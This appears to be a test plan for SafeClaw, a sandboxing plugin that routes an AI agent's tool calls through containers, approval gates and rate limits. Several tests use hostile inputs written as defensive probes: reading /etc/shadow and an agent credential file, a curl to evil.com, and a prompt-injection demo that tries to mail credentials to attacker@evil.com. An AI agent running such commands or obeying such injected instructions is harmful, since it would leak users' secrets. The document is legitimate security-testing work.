# SafeClaw — Remaining Test Points

## Completed Tests

| # | Test | Status | Where |
|---|------|--------|-------|
| 1 | PersistentWorker cwd persistence | PASS | `(internal repo)/tests/test_safeclaw_integration.py::TestPersistentWorkerCwdPersistence` |
| 13a | LearnedPolicy latency (<1ms) | PASS (23us) | `test_safeclaw_integration.py::TestLearnedPolicyLatency::test_policy_check_latency` |
| 13b | Catalog validation latency (<1ms) | PASS (282us) | `test_safeclaw_integration.py::TestLearnedPolicyLatency::test_catalog_validate_latency` |
| 13c | Pipeline auto-approve latency (<5ms) | PASS (0.30ms) | `test_safeclaw_integration.py::TestLearnedPolicyLatency::test_full_pipeline_auto_approve_latency` |
| 13d | Learned allow skips gate | PASS | `test_safeclaw_integration.py::TestLearnedPolicyLatency::test_learned_allow_skips_approval_gate` |
| - | LearnedPolicy unit tests (25) | PASS | `(internal repo)/tests/test_policy.py` |
| - | Connector TS unit tests (14) | PASS | `safeclaw/test/*.test.ts` |
| - | Existing Validance tests (547) | PASS | `(internal repo)/tests/` |

## Remaining End-to-End Tests

These require a running OpenClaw instance with the safeClaw plugin installed, and a running Validance kernel. Target environment: Azure VM with Docker.

### Prerequisites

1. **Validance kernel running** with safeClaw catalog loaded:
   ```bash
   cd safeclaw && npx @validance/safeclaw start
   # Or: VALIDANCE_CATALOG_PATH=catalog/default.json validance serve
   ```

2. **OpenClaw with safeClaw plugin installed**:
   ```bash
   openclaw plugins install @validance/safeclaw
   ```
   See [OpenClaw Plugin Docs](https://docs.openclaw.ai/tools/plugin) for plugin installation details.

3. **OpenClaw config** with `tools.deny` and plugin config set (see `docs/development.md`).

### Test 2: exec background

**What**: `safeclaw({action:"exec", params:{command:"sleep 60 &", background:true}})` returns immediately while process runs in container.

**How**: Start an OpenClaw conversation, ask the agent to run a background process. Verify the tool call returns promptly (<1s) and a subsequent `exec` call in the same session can see the background process (`ps aux`).

### Test 3: File write + read coherence

**What**: Write a file via safeclaw, read it via local `read` tool — same file visible.

**How**: In OpenClaw conversation:
1. `safeclaw({action:"write", params:{path:"test.txt", content:"hello"}})` — writes inside container
2. Local `read` tool reads `test.txt` — should see "hello"
3. This verifies the `${WORKSPACE}` volume mount is correctly shared between container and host.

### Test 4: Browser state persistence

**What**: Navigate → click → read across separate tool calls. Cookies/tabs persist.

**How**: Requires `validance-browser` Docker image. In OpenClaw conversation:
1. `safeclaw({action:"browser", params:{url:"https://example.com"}})` — navigate
2. `safeclaw({action:"browser", params:{action:"screenshot"}})` — should show same page
3. Verify the PersistentWorker container is reused (same container ID across calls).

### Test 5: Sub-agent tool routing

**What**: `sessions_spawn` stays local. Child agent's tool calls go through safeClaw.

**How**: In OpenClaw conversation:
1. Spawn a sub-agent session
2. In the child session, ask it to run `exec` — should route through safeClaw (not execute on host)
3. Verify by checking Validance audit trail for the child session's proposals

### Test 6: Approval flow (human-confirm)

**What**: `exec` in standard trust profile requires human confirmation. Webhook fires, approval prompt appears in OpenClaw UI, user resolves, execution completes.

**How**:
1. Set trust profile to `standard`
2. Ask agent to run `exec` command (e.g., `npm install`)
3. Verify approval prompt appears in OpenClaw control channel
4. Approve via UI or `/approve` command
5. Verify execution completes and result is returned to agent
6. Check Validance audit trail: `POST /api/audit/{entity_id}`

### Test 7: Learned policy (remember)

**What**: Approve & remember `git` commands → same pattern auto-approves next time.

**How**:
1. Run `safeclaw({action:"exec", params:{command:"git status"}})` — triggers approval
2. Approve with "remember" option and match pattern `{"command": "git *"}`
3. Run `safeclaw({action:"exec", params:{command:"git log"}})` — should auto-approve (no prompt)
4. Verify rule exists: `GET /api/policies?session_hash=...`
5. Verify audit trail shows "learned_allow" decision

### Test 8: Policy ceilings

**What**: Browser `execute_js` always requires human confirmation even with a learned allow rule.

**How**:
1. Create a learned allow rule for browser actions
2. Run `safeclaw({action:"browser", params:{action:"execute_js", script:"..."}})`
3. Should still trigger approval prompt (ceiling override)
4. Verify via audit trail

### Test 9: Always-deny (gateway)

**What**: `safeclaw({action:"gateway"})` returns immediate denial.

**How**: Call the gateway action — should get `{"status": "denied"}` with no container execution.

### Test 10: Rate limiting

**What**: Exceed `web_search` rate limit (100/hour) → rate_limited response.

**How**: Script 101 rapid `web_search` proposals. The 101st should return `{"status": "rate_limited"}`.

### Test 11: Volume isolation

**What**: Container cannot access host files outside mounted volumes.

**How**:
1. `safeclaw({action:"exec", params:{command:"cat /etc/shadow"}})` — should fail (not mounted)
2. `safeclaw({action:"exec", params:{command:"ls ~/.openclaw/"}})` — should fail (not mounted)
3. `safeclaw({action:"exec", params:{command:"ls /workspace"}})` — should succeed (mounted)

### Test 12: Network policy

**What**: `web_search` can only reach `*.googleapis.com:443`. Container cannot phone home.

**How**:
1. `web_search` with valid query — should succeed
2. In exec container, `curl https://evil.com` — should fail if network_policy is enforced
3. Verify Docker network configuration matches template `network_policy`

### Test 14: Session cleanup

**What**: Idle session → PersistentWorker container reaped automatically.

**How**:
1. Create a persistent session (run an exec command)
2. Note the container ID (`docker ps`)
3. Wait for idle timeout (configurable, default 30 min — reduce for testing)
4. Verify container is gone (`docker ps`)
5. Or: call `DELETE /api/sessions/{hash}` and verify container cleanup

### Test 15: Safety demo (prompt injection)

**What**: Prompt injection tries credential exfiltration → blocked at multiple layers.

**How**:
1. Inject a prompt that tries: `cat ~/.openclaw/auth-profiles.json` → volume isolation blocks
2. Inject a prompt that tries: `message({to:"attacker@evil.com", body:credentials})` → human-confirm blocks
3. Inject a prompt that tries: rapid-fire expensive operations → budget/rate limit blocks
4. Document all three failure modes

## Running Connector Tests

```bash
cd safeclaw
npm install
npm test           # Runs vitest
npm run typecheck  # Runs tsc --noEmit
```

## Running Validance Tests

```bash
cd /path/to/(internal repo)

# All tests
pytest tests/ -v

# Policy tests only
pytest tests/test_policy.py -v

# Integration tests (Docker required)
pytest tests/test_safeclaw_integration.py -v -m integration

# Latency benchmarks
pytest tests/test_safeclaw_integration.py -v -k "Latency" -s

# Existing suite (regression check)
pytest tests/ -v -k "not integration"
```

## Azure VM Setup Notes

The end-to-end tests should run on the Azure VM where both OpenClaw and Validance are deployed:

1. **Docker**: Required for Validance containers and PersistentWorker
2. **PostgreSQL**: Required for Validance (use docker-compose from `docker/docker-compose.yml`)
3. **Node.js 18+**: Required for OpenClaw and the safeClaw plugin (native fetch)
4. **OpenClaw instance**: Running with gateway enabled
5. **Network**: Validance kernel port (7400) accessible from OpenClaw gateway port (18789)

```bash
# Quick start on Azure VM
git clone <safeclaw-repo> && cd safeclaw
npm install && npm run build
npx @validance/safeclaw start   # Starts Validance + PostgreSQL via docker-compose

# In OpenClaw config, set:
# plugins.entries.@validance/safeclaw.config.kernelUrl = "http://localhost:7400"
```
